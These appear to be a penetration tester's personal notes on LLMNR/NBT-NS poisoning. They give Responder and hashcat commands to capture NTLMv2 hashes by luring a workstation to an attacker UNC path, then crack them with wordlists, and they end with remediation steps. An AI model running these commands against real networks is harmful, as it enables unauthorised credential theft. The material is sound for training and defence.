Link Local Multicast Name Resolution

best to run this first in the morning to see traffic or after lunch

LLMNR is used to identify hosts when DNS fails to do so.

Previously known as NBT-NS
NOTE: MAKE SURE ALL ARE ON on /etc/responder/Responder.conf
first section ^^^
Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.

`sudo responder -I eth0 -dwP`

get workstation to open UNC `\\<ATTACKER_IP>` in file browser

once you have has run:

ON HOST MACHINE NOT VM
`hashcat --help | grep <typeofhash>`
`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt`
use rulesets -r OneRule
use -O on metal for optimization
rockyou2021 good list

Remediation:

Disable LLMNR in group policy
turn off mulicast name resolution

OR

require network access control
require strong user passwords